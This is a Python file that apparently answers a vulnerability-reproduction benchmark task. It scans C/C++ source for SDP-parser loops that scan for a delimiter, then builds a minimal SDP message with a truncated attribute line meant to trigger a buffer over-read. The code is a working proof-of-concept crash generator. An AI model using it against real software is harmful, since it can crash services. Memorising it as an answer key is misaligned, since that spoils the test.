import os
import re
import tarfile
import tempfile
from typing import Optional, Tuple


class Solution:
    _C_EXTS = {
        ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx", ".inc", ".ipp", ".inl", ".m", ".mm"
    }

    _ATTRS = [
        ("rtpmap", 10),
        ("fmtp", 9),
        ("candidate", 8),
        ("ssrc", 7),
        ("rtcp-fb", 6),
        ("extmap", 6),
        ("rid", 5),
        ("fingerprint", 5),
        ("mid", 4),
        ("msid", 4),
        ("ice-ufrag", 3),
        ("ice-pwd", 3),
        ("setup", 3),
        ("group", 3),
    ]

    def solve(self, src_path: str) -> bytes:
        root = self._prepare_root(src_path)
        attr, op, delim = self._detect_attr_and_loop(root)
        return self._build_poc(attr, op, delim)

    def _prepare_root(self, src_path: str) -> str:
        if os.path.isdir(src_path):
            return src_path

        tmpdir = tempfile.mkdtemp(prefix="src_")
        try:
            with tarfile.open(src_path, "r:*") as tf:
                tf.extractall(tmpdir)
        except Exception:
            return tmpdir

        try:
            entries = [e for e in os.listdir(tmpdir) if not e.startswith(".")]
            if len(entries) == 1:
                cand = os.path.join(tmpdir, entries[0])
                if os.path.isdir(cand):
                    return cand
        except Exception:
            pass
        return tmpdir

    def _is_relevant_file(self, path: str) -> bool:
        lp = path.lower()
        if "sdp" in lp:
            return True
        if "parser" in lp and ("rtp" in lp or "ice" in lp):
            return True
        bn = os.path.basename(lp)
        return "sdp" in bn

    def _read_text(self, path: str, max_bytes: int = 1_500_000) -> Optional[str]:
        try:
            st = os.stat(path)
            if st.st_size <= 0 or st.st_size > max_bytes:
                return None
            with open(path, "rb") as f:
                data = f.read(max_bytes + 1)
            if len(data) > max_bytes:
                return None
            return data.decode("latin-1", errors="ignore")
        except Exception:
            return None

    def _unescape_c_char(self, s: str) -> Optional[str]:
        if not s:
            return None
        if len(s) == 1 and s != "\\":
            return s
        if s[0] != "\\":
            return s[0]
        if s == "\\t":
            return "\t"
        if s == "\\n":
            return "\n"
        if s == "\\r":
            return "\r"
        if s == "\\0":
            return "\0"
        if s == "\\\\":
            return "\\"
        if s == "\\'":
            return "'"
        if s.startswith("\\x") and len(s) >= 4:
            try:
                v = int(s[2:4], 16)
                return chr(v)
            except Exception:
                return None
        if s[1:].isdigit():
            try:
                v = int(s[1:], 8)
                return chr(v & 0xFF)
            except Exception:
                return None
        return None

    def _detect_attr_and_loop(self, root: str) -> Tuple[str, str, str]:
        default = ("rtpmap", "!=", " ")
        candidates = []
        total_budget = 30_000_000
        used = 0

        while_pat = re.compile(
            r"(?s)\bwhile\s*\(\s*\*\s*(?P<var>[A-Za-z_]\w*)\s*(?P<op>==|!=)\s*'(?P<ch>(?:\\.|[^'])+)'\s*\)"
        )
        for_pat = re.compile(
            r"(?s)\bfor\s*\(\s*;\s*\*\s*(?P<var>[A-Za-z_]\w*)\s*(?P<op>==|!=)\s*'(?P<ch>(?:\\.|[^'])+)'\s*;"
        )

        def scan_text(text: str, fpath: str) -> None:
            lower = text.lower()
            for m in list(while_pat.finditer(text)) + list(for_pat.finditer(text)):
                op = m.group("op")
                ch_raw = m.group("ch")
                ch = self._unescape_c_char(ch_raw)
                if ch is None or len(ch) != 1:
                    continue
                start = max(0, m.start() - 600)
                end = min(len(text), m.end() + 600)
                window = lower[start:end]
                score = 0
                best_attr = None
                for a, w in self._ATTRS:
                    if a in window:
                        score += w
                        if best_attr is None or w > dict(self._ATTRS).get(best_attr, 0):
                            best_attr = a
                if best_attr is None:
                    if "sdp" in fpath.lower():
                        best_attr = "rtpmap"
                        score += 1
                    else:
                        continue
                if "&&" in text[m.start():m.end()] or "||" in text[m.start():m.end()]:
                    continue
                score += 2 if ch in (" ", "\t") else 0
                candidates.append((score, best_attr, op, ch))

        def walk_and_scan(restrict: bool) -> None:
            nonlocal used, total_budget
            for dirpath, _, filenames in os.walk(root):
                if used >= total_budget:
                    return
                ldp = dirpath.lower()
                if any(x in ldp for x in ("/.git", "\\.git", "/third_party/", "\\third_party\\", "/vendor/", "\\vendor\\")):
                    continue
                for fn in filenames:
                    if used >= total_budget:
                        return
                    ext = os.path.splitext(fn)[1].lower()
                    if ext not in self._C_EXTS:
                        continue
                    fpath = os.path.join(dirpath, fn)
                    if restrict and not self._is_relevant_file(fpath):
                        continue
                    txt = self._read_text(fpath)
                    if txt is None:
                        continue
                    used += len(txt)
                    scan_text(txt, fpath)

        walk_and_scan(restrict=True)
        if not candidates:
            walk_and_scan(restrict=False)

        if not candidates:
            return default

        candidates.sort(key=lambda x: x[0], reverse=True)
        _, attr, op, ch = candidates[0]
        return (attr, op, ch)

    def _make_attr_line(self, attr: str, op: str, delim: str) -> str:
        if delim in ("\n", "\r", "\0"):
            delim = " "
        if op == "==":
            if delim in (" ", "\t"):
                value = delim * 8
            else:
                value = delim * 4
        else:
            if delim in (" ", "\t"):
                value = "0"
            elif delim == "/":
                value = "a"
            elif delim in ("=", ":", ";", ","):
                value = "a"
            else:
                value = "a"
        return f"a={attr}:{value}"

    def _build_poc(self, attr: str, op: str, delim: str) -> bytes:
        attr = (attr or "rtpmap").strip()
        if not attr:
            attr = "rtpmap"
        attr_line = self._make_attr_line(attr, op, delim)
        pre = [
            "v=0",
            "o=- 0 0 IN IP4 127.0.0.1",
            "s=-",
            "t=0 0",
            "c=IN IP4 0.0.0.0",
            "m=audio 9 RTP/AVP 0",
        ]
        s = "\n".join(pre) + "\n" + attr_line
        return s.encode("ascii", errors="ignore")